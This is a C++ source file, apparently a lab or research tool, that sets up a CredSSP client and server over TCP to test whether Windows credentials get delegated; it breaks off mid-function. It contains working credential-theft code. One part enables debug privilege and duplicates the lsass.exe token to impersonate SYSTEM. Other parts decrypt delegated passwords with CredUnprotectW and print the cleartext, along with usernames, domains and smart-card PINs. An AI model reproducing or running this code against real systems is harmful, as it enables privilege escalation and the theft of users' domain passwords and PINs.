

#define SECURITY_WIN32
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <sspi.h>
#include <credssp.h>     /* CREDSSP_NAME, CREDSSP_CRED, CredsspSubmitType* */
#include <schannel.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <iostream>
#include <ntsecapi.h>
#include <wincred.h>
#include <vector>
#include <TlHelp32.h>



#pragma comment(lib, "secur32.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "Advapi32.lib")

#define PKG "Credential Provider"
//char* CREDSSP_PACKAGE_NAME = "CredSSP";
#define MAXTOK     49152

 /* ------- tiny length-prefixed token framing over TCP (research transport) ------- */
static int send_all(SOCKET s, const char* p, int n) {
    while (n > 0) { int k = send(s, p, n, 0); if (k <= 0) return -1; p += k; n -= k; }
    return 0;
}
static int send_tok(SOCKET s, const void* buf, unsigned int len) {
    unsigned int be = htonl(len);
    if (send_all(s, (char*)&be, 4)) return -1;
    return len ? send_all(s, (const char*)buf, (int)len) : 0;
}
static int recv_all(SOCKET s, char* p, int n) {
    while (n > 0) { int k = recv(s, p, n, 0); if (k <= 0) return -1; p += k; n -= k; }
    return 0;
}
static int recv_tok(SOCKET s, char* buf, unsigned int cap, unsigned int* out) {
    unsigned int be; if (recv_all(s, (char*)&be, 4)) return -1;
    unsigned int len = ntohl(be); if (len > cap) return -1;
    if (len && recv_all(s, buf, (int)len)) return -1;
    *out = len; return 0;
}

static const char* isc_name(SECURITY_STATUS s) {
    switch (s) {
    case SEC_E_OK:                  return "SEC_E_OK";
    case SEC_I_CONTINUE_NEEDED:     return "SEC_I_CONTINUE_NEEDED";
    case SEC_E_DELEGATION_POLICY:   return "SEC_E_DELEGATION_POLICY (blocked by allow-list)";
    case SEC_E_POLICY_NLTM_ONLY:    return "SEC_E_POLICY_NLTM_ONLY (NTLM-only policy gate)";
    case SEC_E_LOGON_DENIED:        return "SEC_E_LOGON_DENIED";
    case SEC_E_NO_CREDENTIALS:      return "SEC_E_NO_CREDENTIALS";
    default:                        return "(other)";
    }
}

/* =============================== CLIENT =============================== */
/*static int run_client(const char* host, const char* port, const char* spn, int useFresh) {
    ADDRINFOA hints = { 0 }, * ai = NULL;
    hints.ai_family = AF_INET; hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(host, port, &hints, &ai)) { fprintf(stderr, "getaddrinfo\n"); return 1; }
    SOCKET s = socket(ai->ai_family, ai->ai_socktype, ai->ai_protocol);
    if (connect(s, ai->ai_addr, (int)ai->ai_addrlen)) { fprintf(stderr, "connect\n"); return 1; }
    freeaddrinfo(ai);

    /* --- outer TLS credential for the CredSSP channel; client stays anonymous --- 
    SCHANNEL_CRED sc = { 0 }; sc.dwVersion = SCHANNEL_CRED_VERSION;

    /* --- optional fresh identity; NULL => DEFAULT (session SSO) credentials --- 
    SEC_WINNT_AUTH_IDENTITY_W id = { 0 };
    if (useFresh) {
        /* Fill from env for lab convenience: CS_USER / CS_DOMAIN / CS_PASS 
        static WCHAR u[128], d[128], p[128];
        MultiByteToWideChar(CP_UTF8, 0, getenv("CS_USER") ? getenv("CS_USER") : "", -1, u, 128);
        MultiByteToWideChar(CP_UTF8, 0, getenv("CS_DOMAIN") ? getenv("CS_DOMAIN") : "", -1, d, 128);
        MultiByteToWideChar(CP_UTF8, 0, getenv("CS_PASS") ? getenv("CS_PASS") : "", -1, p, 128);
        id.User = (unsigned short *)u; id.UserLength = (unsigned long)wcslen(u);
        id.Domain = (unsigned short*)d; id.DomainLength = (unsigned long)wcslen(d);
        id.Password = (unsigned short*)p; id.PasswordLength = (unsigned long)wcslen(p);
        id.Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;
    }

    CREDSSP_CRED cred = {  };
    cred.Type = CredsspPasswordCreds;   /* let SSP pick bucket 
    cred.pSchannelCred = &sc;
    cred.pSpnegoCred = useFresh ? (void*)&id : NULL; /* NULL => default creds 
   
    
    CredHandle hCred; TimeStamp ts;
    SECURITY_STATUS st = AcquireCredentialsHandleA(NULL, (SEC_CHAR*)"TSSSP", SECPKG_CRED_OUTBOUND, NULL, &cred, NULL, NULL, &hCred, &ts);
    printf("[client] AcquireCredentialsHandle(CREDSSP,OUTBOUND) = 0x%08lx  bucket=%s\n",
        st, useFresh ? "FRESH" : "DEFAULT");
    if (FAILED(st)) return 1;

    CtxtHandle ctx; BOOL have = FALSE;
    DWORD req = ISC_REQ_DELEGATE            /* <-- the delegation opt-in; toggle to compare 
        | ISC_REQ_MUTUAL_AUTH
        | ISC_REQ_CONFIDENTIALITY
        | ISC_REQ_ALLOCATE_MEMORY;

    DWORD attr = 0;
    char  inbuf[MAXTOK]; unsigned int inlen = 0;

    SecBuffer      ib = { 0, SECBUFFER_TOKEN, NULL };
    SecBufferDesc  iD = { SECBUFFER_VERSION, 1, &ib };

    st = SEC_I_CONTINUE_NEEDED;
    while (st == SEC_I_CONTINUE_NEEDED) {
        SecBuffer     ob = { 0, SECBUFFER_TOKEN, NULL };
        SecBufferDesc oD = { SECBUFFER_VERSION, 1, &ob };

        st = InitializeSecurityContextA(
            &hCred, have ? &ctx : NULL, (SEC_CHAR*)spn,
            req, 0, SECURITY_NATIVE_DREP,
            have ? &iD : NULL, 0, &ctx, &oD, &attr, &ts);
        have = TRUE;

        printf("[client] ISC -> 0x%08lx  %s\n", st, isc_name(st));

        if ((st == SEC_I_CONTINUE_NEEDED || st == SEC_E_OK) && ob.cbBuffer && ob.pvBuffer) {
            send_tok(s, ob.pvBuffer, ob.cbBuffer);
            FreeContextBuffer(ob.pvBuffer);
        }
        if (st == SEC_E_OK) break;
        if (FAILED(st)) {
            /* ---- THE POLICY BOUNDARY. This is your primary datum for the sweep. ---- 
            printf("[client] >>> policy gate result for SPN '%s': DENIED (%s)\n", spn, isc_name(st));
            closesocket(s); return 2;
        }
        if (recv_tok(s, inbuf, sizeof inbuf, &inlen)) { fprintf(stderr, "recv\n"); return 1; }
        ib.pvBuffer = inbuf; ib.cbBuffer = inlen; ib.BufferType = SECBUFFER_TOKEN;
    }

    QueryContextAttributesA(&ctx, SECPKG_ATTR_FLAGS, &attr);
    printf("[client] >>> policy gate result for SPN '%s': PERMITTED\n", spn);
    printf("[client]     ISC_RET_DELEGATE = %s\n",
        (attr & ISC_RET_DELEGATE) ? "SET (credentials were delegated)"
        : "NOT SET (SSP declined to delegate)");
    closesocket(s);
    return 0;
}*/





typedef PSecurityFunctionTableW(SEC_ENTRY* INIT_SEC_FN_W)(void);

static int run_client(const char* host, const char* port, const char* spn, int useFresh) {

    /* ---- transport (unchanged; bytes are opaque) ---- */

    ADDRINFOA hints = { 0 }, * ai = NULL;
    hints.ai_family = AF_INET; hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(host, port, &hints, &ai)) { fprintf(stderr, "getaddrinfo\n"); return 1; }
    SOCKET s = socket(ai->ai_family, ai->ai_socktype, ai->ai_protocol);
    if (connect(s, ai->ai_addr, (int)ai->ai_addrlen)) { fprintf(stderr, "connect\n"); return 1; }
    freeaddrinfo(ai);


    /* ---- bind DIRECTLY to credssp.dll and use ITS table for everything ---- */
    HMODULE h = LoadLibraryW(L"credssp.dll");

    if (!h) { fprintf(stderr, "LoadLibrary(credssp.dll) failed %lu\n", GetLastError()); return 1; }
    INIT_SEC_FN_W pInit = (INIT_SEC_FN_W)GetProcAddress(h, "InitSecurityInterfaceW");
    if (!pInit) { fprintf(stderr, "no InitSecurityInterfaceW export\n"); return 1; }
    PSecurityFunctionTableW ft = pInit();
    if (!ft) { fprintf(stderr, "null function table\n"); return 1; }

    /* ---- DECISIVE PROBE: does the name resolve through THIS table? ---- */
    SecPkgInfoW* pi = NULL;
    SECURITY_STATUS q = ft->QuerySecurityPackageInfoW((SEC_WCHAR*)L"CredSSP", &pi);
    wprintf(L"[client] QuerySecurityPackageInfo(CredSSP) = 0x%08lx name=%s\n",
        q, (q == SEC_E_OK && pi) ? pi->Name : L"(none)");
    if (pi) ft->FreeContextBuffer(pi);
    if (q != SEC_E_OK) {
        fwprintf(stderr, L"[client] CredSSP not resolvable via credssp.dll table -> substantive finding\n");
        /* don't hard-return; you may still want to see the ACH result below */
    }

    /* ---- credentials ---- */
    SCHANNEL_CRED sc = { 0 }; sc.dwVersion = SCHANNEL_CRED_VERSION;
    SEC_WINNT_AUTH_IDENTITY_W id = { 0 };
    if (useFresh) {
        static WCHAR u[128], d[128], p[128];
        MultiByteToWideChar(CP_UTF8, 0, getenv("CS_USER") ? getenv("CS_USER") : "", -1, u, 128);
        MultiByteToWideChar(CP_UTF8, 0, getenv("CS_DOMAIN") ? getenv("CS_DOMAIN") : "", -1, d, 128);
        MultiByteToWideChar(CP_UTF8, 0, getenv("CS_PASS") ? getenv("CS_PASS") : "", -1, p, 128);
        id.User = (unsigned short*)u; id.UserLength = (unsigned long)wcslen(u);

        id.Domain = (unsigned short*)d; id.DomainLength = (unsigned long)wcslen(d);
        id.Password = (unsigned short*)p; id.PasswordLength = (unsigned long)wcslen(p);

        id.Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;

    }

    CREDSSP_CRED cred = {  };
    cred.Type = CredsspPasswordCreds; /* Type tracks payload */
    cred.pSchannelCred = &sc;

    cred.pSpnegoCred = &id;

    /* ---- convert the SPN to wide (argv is char*) ---- */

    WCHAR wspn[512];
    MultiByteToWideChar(CP_UTF8, 0, spn ? spn : "", -1, wspn, 512);


    CredHandle hCred; TimeStamp ts;

    SECURITY_STATUS st = ft->AcquireCredentialsHandleW(NULL, (SEC_WCHAR*)L"CredSSP", SECPKG_CRED_OUTBOUND, NULL, NULL, NULL, NULL, &hCred, &ts);
    printf("[client] AcquireCredentialsHandleW(CredSSP,OUTBOUND) = 0x%08lx bucket=%s\n", st, useFresh ? "FRESH" : "DEFAULT");
    if (FAILED(st)) { closesocket(s); return 1; }

    /* ---- ISC loop, all through the SAME table, all W ---- */

    CtxtHandle ctx; BOOL have = FALSE;
    DWORD req = ISC_REQ_DELEGATE | ISC_REQ_MUTUAL_AUTH | ISC_REQ_ALLOCATE_MEMORY;
    DWORD attr = 0;
    char inbuf[MAXTOK]; unsigned int inlen = 0;
  //  SecBuffer ib = {0, SECBUFFER_TOKEN, NULL};

   // SecBufferDesc iD = { SECBUFFER_VERSION, 1, &ib };
    SecBuffer ib[2] = { 0 };

    ib[0].BufferType = SECBUFFER_TOKEN;
    ib[1].BufferType = SECBUFFER_EMPTY;

    SecBufferDesc iD = {
        SECBUFFER_VERSION,
        2,
        ib
    };

    st = SEC_I_CONTINUE_NEEDED;
    while (st == SEC_I_CONTINUE_NEEDED) {
        SecBuffer ob = { 0, SECBUFFER_TOKEN, NULL };
        SecBufferDesc oD = { SECBUFFER_VERSION, 1, &ob };


        st = ft->InitializeSecurityContextW(&hCred, have ? &ctx : NULL, (SEC_WCHAR*)wspn, req, 0, SECURITY_NATIVE_DREP, have ? &iD : NULL, 0, &ctx, &oD, &attr, &ts);
        have = TRUE;

        printf("[client] ISC -> 0x%08lx %s\n", st, isc_name(st));

        if ((st == SEC_I_CONTINUE_NEEDED || st == SEC_E_OK) && ob.cbBuffer && ob.pvBuffer) {

            send_tok(s, ob.pvBuffer, ob.cbBuffer);

            ft->FreeContextBuffer(ob.pvBuffer); /* free via same table */

        }
        if (st == SEC_E_OK) break;
        if (FAILED(st)) {
            printf("[client] >>> policy gate result for SPN '%s': DENIED (%s)\n", spn, isc_name(st));
            ft->FreeCredentialsHandle(&hCred);
            closesocket(s); return 2;
        }
        if (recv_tok(s, inbuf, sizeof inbuf, &inlen)) { fprintf(stderr, "recv\n"); return 1; }
        ib[0].pvBuffer = inbuf; ib[0].cbBuffer = inlen; ib[0].BufferType = SECBUFFER_TOKEN;

    }

    ft->QueryContextAttributesW(&ctx, SECPKG_ATTR_FLAGS, &attr);

    printf("[client] >>> policy gate result for SPN '%s': PERMITTED\n", spn);

    printf("[client] ISC_RET_DELEGATE = %s\n",
        (attr & ISC_RET_DELEGATE) ? "SET (credentials were delegated)" : "NOT SET (SSP declined to delegate)");


    ft->FreeCredentialsHandle(&hCred);

    closesocket(s);

    return 0;

}



/* =============================== SERVER =============================== */
/*
 * Minimal acceptor. To exercise the X.509 server-auth path (so the client uses
 * AllowDefaultCredentials rather than the NTLM-only policy), point SCHANNEL_CRED
 * at a server certificate (cCreds/paCred). Left empty here for lab brevity.
 */
/*static int run_server(const char* bind_ip, const char* port) {
    ADDRINFOA hints = { 0 }, * ai = NULL;
    hints.ai_family = AF_INET; hints.ai_socktype = SOCK_STREAM; hints.ai_flags = AI_PASSIVE;
    getaddrinfo(bind_ip, port, &hints, &ai);
    SOCKET ls = socket(ai->ai_family, ai->ai_socktype, ai->ai_protocol);
    bind(ls, ai->ai_addr, (int)ai->ai_addrlen); listen(ls, 1); freeaddrinfo(ai);
    printf("[server] listening on %s:%s ...\n", bind_ip, port);
    SOCKET s = accept(ls, NULL, NULL);
    printf("[server] client connected\n");

    SCHANNEL_CRED sc = { 0 }; sc.dwVersion = SCHANNEL_CRED_VERSION;
    /* sc.cCreds = 1; sc.paCred = &pServerCertCtx;   <-- supply for cert-based server auth 

    CREDSSP_CRED cred = {  };
    cred.Type = CredsspPasswordCreds; cred.pSchannelCred = &sc; cred.pSpnegoCred = NULL;

    CredHandle hCred; TimeStamp ts;
    SECURITY_STATUS st = AcquireCredentialsHandleA(
        NULL, (SEC_CHAR*)PKG, SECPKG_CRED_INBOUND, NULL, &cred, NULL, NULL, &hCred, &ts);
    printf("[server] AcquireCredentialsHandle(CREDSSP,INBOUND) = 0x%08lx\n", st);
    if (FAILED(st)) return 1;

    CtxtHandle ctx; BOOL have = FALSE; DWORD attr = 0;
    char inbuf[MAXTOK]; unsigned int inlen = 0;

    st = SEC_I_CONTINUE_NEEDED;
    while (st == SEC_I_CONTINUE_NEEDED || st == SEC_E_OK) {
        if (recv_tok(s, inbuf, sizeof inbuf, &inlen)) break;
        SecBuffer     ib = { inlen, SECBUFFER_TOKEN, inbuf };
        SecBufferDesc iD = { SECBUFFER_VERSION, 1, &ib };
        SecBuffer     ob = { 0, SECBUFFER_TOKEN, NULL };
        SecBufferDesc oD = { SECBUFFER_VERSION, 1, &ob };

        st = AcceptSecurityContext(
            &hCred, have ? &ctx : NULL, &iD,
            ASC_REQ_DELEGATE | ASC_REQ_CONFIDENTIALITY | ASC_REQ_ALLOCATE_MEMORY,
            SECURITY_NATIVE_DREP, &ctx, &oD, &attr, &ts);
        have = TRUE;
        printf("[server] ASC -> 0x%08lx\n", st);

        if ((st == SEC_I_CONTINUE_NEEDED || st == SEC_E_OK) && ob.cbBuffer && ob.pvBuffer) {
            send_tok(s, ob.pvBuffer, ob.cbBuffer);
            FreeContextBuffer(ob.pvBuffer);
        }
        if (st == SEC_E_OK) break;
        if (FAILED(st)) { printf("[server] ASC failed\n"); break; }
    }

    if (st == SEC_E_OK) {
        printf("[server] context established. Delegated credentials should now be retrievable.\n");
        /*
         * GROUND-TRUTH RETRIEVAL OF THE DELEGATED TSCredentials:
         *   The CredSSP acceptor exposes the released credentials via
         *   QueryContextAttributes on the CredSSP context. The exact attribute
         *   id / return struct is defined in credssp.h for your SDK
         *   (candidates to confirm on YOUR headers:
         *      SECPKG_ATTR_CREDS       -> returns a CREDSSP cred blob, or
         *      SECPKG_ATTR_C_ACCESS_TOKEN / SECPKG_ATTR_C_FULL_ACCESS_TOKEN
         *        -> impersonation token built from the delegated creds).
         *   Verify against <credssp.h> rather than trusting this comment.
         *
         *   Simplest reliable confirmation without the acceptor query:
         *   the CLIENT-side ISC_RET_DELEGATE + SEC_E_OK already proves the
         *   policy permitted and the SSP emitted TSCredentials. Use the
         *   pyspnego acceptor (credssp_sweep.py) if you want to DECODE the
         *   TSCredentials structure itself.
         
        HANDLE tok = NULL;
        st = QuerySecurityContextToken(&ctx, &tok);
        if (st == SEC_E_OK && tok) {
            printf("[server] obtained access token from delegated context (handle=%p)\n", tok);
            /* GetTokenInformation(tok, TokenUser, ...) to print the delegated identity 
            CloseHandle(tok);
        }
        else {
            printf("[server] QuerySecurityContextToken = 0x%08lx (see credssp.h creds attrs)\n", st);
        }
    }

    closesocket(s); closesocket(ls);
    return 0;
}*/



BOOL EnablePrivilege(LPCWSTR privName) {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;

    if (!LookupPrivilegeValue(NULL, privName, &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL success = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);
    return success && GetLastError() == ERROR_SUCCESS;
}

bool IsCurrentUserLocalSystem()
{
    HANDLE hToken = nullptr;
    if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &hToken)) {
        // If there's no thread token, fall back to process token
        if (GetLastError() == ERROR_NO_TOKEN) {
            if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
                std::cout << "OpenProcessToken failed" << std::endl;
                return false;
            }
        }
        else {
            std::cout << "OpenThreadToken failed" << std::endl;
            return false;
        }
    }

    BYTE buffer[SECURITY_MAX_SID_SIZE];
    DWORD sidSize = sizeof(buffer);
    PSID localSystemSid = buffer;

    if (!CreateWellKnownSid(WinLocalSystemSid, NULL, localSystemSid, &sidSize)) {
        CloseHandle(hToken);
        std::cout << "CreateWellKnownSid failed" << std::endl;
        return false;
    }

    TOKEN_USER* tokenUser = nullptr;
    DWORD dwSize = 0;
    GetTokenInformation(hToken, TokenUser, nullptr, 0, &dwSize);
    tokenUser = (TOKEN_USER*)malloc(dwSize);

    if (!GetTokenInformation(hToken, TokenUser, tokenUser, dwSize, &dwSize)) {
        free(tokenUser);
        CloseHandle(hToken);
        return false;
    }

    BOOL result = EqualSid(tokenUser->User.Sid, localSystemSid);
    free(tokenUser);
    CloseHandle(hToken);
    return result;
}

bool ImpersonateSystemFromProcess()
{
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
    DWORD pid = 0;

    if (Process32First(hSnapshot, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"lsass.exe") == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);

    if (!pid) return false;
    HANDLE hProc = nullptr, hToken = nullptr, hDupToken = nullptr;

    // Find PID of winlogon.exe (or services.exe, etc.)
    // Let's say it's stored in `pid` already.

    hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProc) {
        std::cout << "OpenProcess failed" << std::endl;
        return false;
    }

    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {

        std::cout << "OpenProcessToken failed" << std::endl;
        return false;
    }


    if (!DuplicateTokenEx(
        hToken,
        MAXIMUM_ALLOWED,
        nullptr,
        SecurityImpersonation,
        TokenImpersonation,
        &hDupToken))
    {
        std::cout << "DuplicateToken failed" << std::endl;
        CloseHandle(hToken);
        return false;
    }

    /*if (!SetThreadToken(nullptr, hDupToken))
    {

        CloseHandle(hToken);
        CloseHandle(hDupToken);
        return false;
    }
    */
    if (!ImpersonateLoggedOnUser(hDupToken)) {

        std::cout << "ImpersonateLoggedOnUser failed" << std::endl;
        return false;

    }

    if (!IsCurrentUserLocalSystem()) {

        std::cout << "We are not system, unknown error" << std::endl;

    }

    // Success
    CloseHandle(hToken);
    CloseHandle(hDupToken);
    CloseHandle(hProc);
    return true;
}


void RevertIfImpersonated()
{
    RevertToSelf(); // Reverts thread token only
}

void TestProtectedPassword(const UNICODE_STRING& password)
{
    if (!password.Buffer || password.Length == 0)
        return;

    // UNICODE_STRING.Length is bytes and is not required to include a NUL.
    const DWORD cchProtected = (password.Length / sizeof(WCHAR)) + 1;
    //DWORD cchProtected = protectedValue.size() + 1;

    std::wstring protectedValue(
        password.Buffer,
        password.Buffer + cchProtected
    );

  //  DWORD cchProtected = protectedValue.size() + 1;
    CRED_PROTECTION_TYPE protectionType = CredUnprotected;

   // wchar_t pv[] = protectedValue;

    if (CredIsProtectedW(const_cast<LPWSTR>(protectedValue.c_str()),&protectionType))
    {
        wprintf(
            L"CredIsProtectedW: protected, type=%u\n",
            static_cast<unsigned>(protectionType)
        );
    }
    else
    {
        DWORD error = GetLastError();
        wprintf(
            L"CredIsProtectedW failed/not protected: %lu\n",
            error
        );
    }

    DWORD requiredChars = 0;


    EnablePrivilege(SE_DEBUG_NAME);
    EnablePrivilege(SE_ASSIGNPRIMARYTOKEN_NAME);

    bool test = ImpersonateSystemFromProcess();

    if (IsCurrentUserLocalSystem()) {

        std::cout << "token is system" << std::endl;
    }
    else {
        std::cout << "System elevation failed" << std::endl;

    }



    // First call obtains the required output size.
    CredUnprotectW(FALSE,protectedValue.data(),cchProtected,nullptr,&requiredChars);

    

    DWORD error = GetLastError();

    if (error != ERROR_INSUFFICIENT_BUFFER) {
        wprintf(
            L"CredUnprotectW sizing failed: %lu\n",
            error
        );
        return;
    }

    std::vector<WCHAR> cleartext(requiredChars);

    if (!CredUnprotectW(
        FALSE,
        protectedValue.data(),
        cchProtected,
        cleartext.data(),
        &requiredChars))
    {
        wprintf(
            L"CredUnprotectW failed: %lu\n",
            GetLastError()
        );

        SecureZeroMemory(
            cleartext.data(),
            cleartext.size() * sizeof(WCHAR)
        );
        return;
    }

    RevertIfImpersonated();

    wprintf(L"CredUnprotectW succeeded.\n");

    std::wcout << cleartext.data() << std::endl;

    // Avoid printing it unless necessary. Compare against the expected
    // password, then immediately clear the buffer.
    SecureZeroMemory(
        cleartext.data(),
        cleartext.size() * sizeof(WCHAR)
    );
}

void ParseAndPrintClientCreds(SecPkgContext_ClientCreds* pClientCreds)
{
    if (!pClientCreds || !pClientCreds->AuthBuffer || pClientCreds->AuthBufferLen < sizeof(KERB_LOGON_SUBMIT_TYPE)) {
        std::wcout << L"Invalid or empty auth buffer.\n";
        return;
    }
    ULONG type = *(ULONG*)pClientCreds->AuthBuffer;
    printf("SubmitType: %lu\n", type);

    // Step 1: Every standard Windows logon structure begins with a KERB_LOGON_SUBMIT_TYPE enum (4 bytes)
    KERB_LOGON_SUBMIT_TYPE* pLogonType = (KERB_LOGON_SUBMIT_TYPE*)pClientCreds->AuthBuffer;

    // Step 2: Switch based on the internal enum value found at the start of AuthBuffer
    if (*pLogonType == KerbInteractiveLogon /* 2 */)
    {
        if (pClientCreds->AuthBufferLen < sizeof(KERB_INTERACTIVE_LOGON)) return;

        PKERB_INTERACTIVE_LOGON pLogon = (PKERB_INTERACTIVE_LOGON)pClientCreds->AuthBuffer;

        // Resolve offsets relative to the start of the buffer
        wchar_t* pUserName = (pLogon->UserName.Length > 0) ? (wchar_t*)((PBYTE)pLogon + (ULONG_PTR)pLogon->UserName.Buffer) : nullptr;
        wchar_t* pDomain = (pLogon->LogonDomainName.Length > 0) ? (wchar_t*)((PBYTE)pLogon + (ULONG_PTR)pLogon->LogonDomainName.Buffer) : nullptr;
        wchar_t* pPassword = (pLogon->Password.Length > 0) ? (wchar_t*)((PBYTE)pLogon + (ULONG_PTR)pLogon->Password.Buffer) : nullptr;

        std::wcout << L"--- Credential Type: Password Logon ---\n";

        std::wcout << L"Domain:   ";
        if (pDomain) std::wcout.write(pDomain, pLogon->LogonDomainName.Length / sizeof(wchar_t));
        std::wcout << L"\nUsername: ";
        if (pUserName) std::wcout.write(pUserName, pLogon->UserName.Length / sizeof(wchar_t));
        std::wcout << L"\nPassword: ";
        std::wcout << L"Password Length: "
            << pLogon->Password.Length
            << std::endl;

        std::wcout << L"Password MaximumLength: "
            << pLogon->Password.MaximumLength
            << std::endl;

        std::wcout << L"Password Offset: "
            << (ULONG_PTR)pLogon->Password.Buffer
            << std::endl;

        UNICODE_STRING resolvedPassword = pLogon->Password;
        resolvedPassword.Buffer = pPassword;

        TestProtectedPassword(resolvedPassword);
       // TestProtectedPassword(pLogon->Password);

    //    for (USHORT i = 0; i < pLogon->Password.Length; i++)
     //   {
      //      printf("%02x ", ((BYTE*)pPassword)[i]);
      //  }

        

      //  if (pPassword) std::wcout.write(pPassword, pLogon->Password.Length / sizeof(wchar_t));
      //  std::wcout << L"\n";



    }
    else if (*pLogonType == KerbCertificateLogon /* 6 */)
    {
        if (pClientCreds->AuthBufferLen < sizeof(KERB_CERTIFICATE_LOGON)) return;

        PKERB_CERTIFICATE_LOGON pCardLogon = (PKERB_CERTIFICATE_LOGON)pClientCreds->AuthBuffer;

        wchar_t* pPin = (pCardLogon->Pin.Length > 0) ? (wchar_t*)((PBYTE)pCardLogon + (ULONG_PTR)pCardLogon->Pin.Buffer) : nullptr;

        std::wcout << L"--- Credential Type: Smart Card Logon ---\n";
        std::wcout << L"PIN: ";
        if (pPin) std::wcout.write(pPin, pCardLogon->Pin.Length / sizeof(wchar_t));
        std::wcout << L"\n";
    }
    else
    {
        std::wcout << L"Unknown internal logon message type: " << *pLogonType << L"\n";
    }
}


static int run_server(const char* bind_ip, const char* port) {
    ADDRINFOA hints = { 0 }, * ai = NULL;
    hints.ai_family = AF_INET; hints.ai_socktype = SOCK_STREAM; hints.ai_flags = AI_PASSIVE;
    getaddrinfo(bind_ip, port, &hints, &ai);
    SOCKET ls = socket(ai->ai_family, ai->ai_socktype, ai->ai_protocol);
    bind(ls, ai->ai_addr, (int)ai->ai_addrlen); listen(ls, 1); freeaddrinfo(ai);
    printf("[server] listening on %s:%s ...\n", bind_ip, port);
    SOCKET s = accept(ls, NULL, NULL);
    printf("[server] client connected\n");

    /* bind directly to credssp.dll's own table -- same pattern as the client */
    HMODULE h = LoadLibraryW(L"credssp.dll");
    INIT_SEC_FN_W pInit = (INIT_SEC_FN_W)GetProcAddress(h, "InitSecurityInterfaceW");
    PSecurityFunctionTableW ft = pInit();
    HCERTSTORE hStore = CertOpenStore(CERT_STORE_PROV_SYSTEM, 0, 0,
        CERT_SYSTEM_STORE_LOCAL_MACHINE, L"MY");
    if (!hStore) {
        printf("[server] CertOpenStore FAILED, GetLastError=%lu\n", GetLastError());
        return 1;
    }


    DWORD bufferSize = 0;
    GetComputerNameExW(ComputerNamePhysicalDnsFullyQualified, nullptr, &bufferSize);
    if (bufferSize == 0) {
        std::wcerr << L"Failed to read the required buffer size. Error: " << GetLastError() << std::endl;
        return 1;
    }
    std::vector<wchar_t> fqdnBuffer(bufferSize);
    if (GetComputerNameExW(ComputerNamePhysicalDnsFullyQualified, fqdnBuffer.data(), &bufferSize)) {
        std::wcout << L"Local System FQDN: " << fqdnBuffer.data() << std::endl;
    }
    else {
        std::wcerr << L"Failed to retrieve FQDN. Error: " << GetLastError() << std::endl;
        return 1;
    }

    //L"dc01.test.local"
 /*   PCCERT_CONTEXT pServerCertCtx = CertFindCertificateInStore(hStore, X509_ASN_ENCODING, 0, CERT_FIND_SUBJECT_STR, fqdnBuffer.data(), NULL);
    if (!pServerCertCtx) {
        printf("[server] CertFindCertificateInStore FAILED, GetLastError=0x%08lx\n", GetLastError());
        return 1;
    }
    printf("[server] found cert, using it for Schannel credential\n");
    */
    /* server needs a real TLS credential -- see cert-provisioning note below */
  /*  SCHANNEL_CRED sc = {0};
    sc.dwVersion = SCHANNEL_CRED_VERSION;
    sc.cCreds = 1;
    sc.paCred = &pServerCertCtx;         /* PCCERT_CONTEXT, see below 

    CREDSSP_CRED cred = {  };
    cred.Type = CredsspSchannelCreds;   /* server side: describe the Schannel cred 
    cred.pSchannelCred = &sc;
    cred.pSpnegoCred = NULL;

    CredHandle hCred; TimeStamp ts;
    SECURITY_STATUS st = ft->AcquireCredentialsHandleW(NULL, (SEC_WCHAR*)L"CredSSP", SECPKG_CRED_INBOUND,NULL, &cred, NULL, NULL, &hCred, &ts);
    printf("[server] AcquireCredentialsHandleW(CredSSP,INBOUND) = 0x%08lx\n", st);*/

    PCCERT_CONTEXT pServerCertCtx = NULL;
    int certCount = 0;
    bool certcheck = false;
    while ((pServerCertCtx = CertEnumCertificatesInStore(hStore, pServerCertCtx)) != NULL) {
        certCount++;

        DWORD cbUsage = 0; CertGetEnhancedKeyUsage(pServerCertCtx, 0, nullptr, &cbUsage);

        std::vector<BYTE> buffer(cbUsage);
        PCERT_ENHKEY_USAGE pUsage = reinterpret_cast<PCERT_ENHKEY_USAGE>(buffer.data());

        if (CertGetEnhancedKeyUsage(pServerCertCtx, 0, pUsage, &cbUsage)) {
            for (DWORD i = 0; i < pUsage->cUsageIdentifier; i++) {
                if (strcmp(pUsage->rgpszUsageIdentifier[i], "1.3.6.1.5.5.7.3.1") == 0)
                {
                    printf("Server Authentication\n");
                    HCRYPTPROV_OR_NCRYPT_KEY_HANDLE hKey = 0;
                    DWORD dwKeySpec = 0;
                    BOOL fCallerFree = FALSE;
                    if (CryptAcquireCertificatePrivateKey(pServerCertCtx, CRYPT_ACQUIRE_ALLOW_NCRYPT_KEY_FLAG, NULL, &hKey, &dwKeySpec, &fCallerFree)) {
                        certcheck = true;
                        break;
                    }

                }
            }
        }
        if (certcheck) {
            break;
        }
    }

    if (!certcheck) {

        return 1;
    }

    SCHANNEL_CRED sc = { 0 };
    sc.dwVersion = SCHANNEL_CRED_VERSION;
    sc.cCreds = 1;
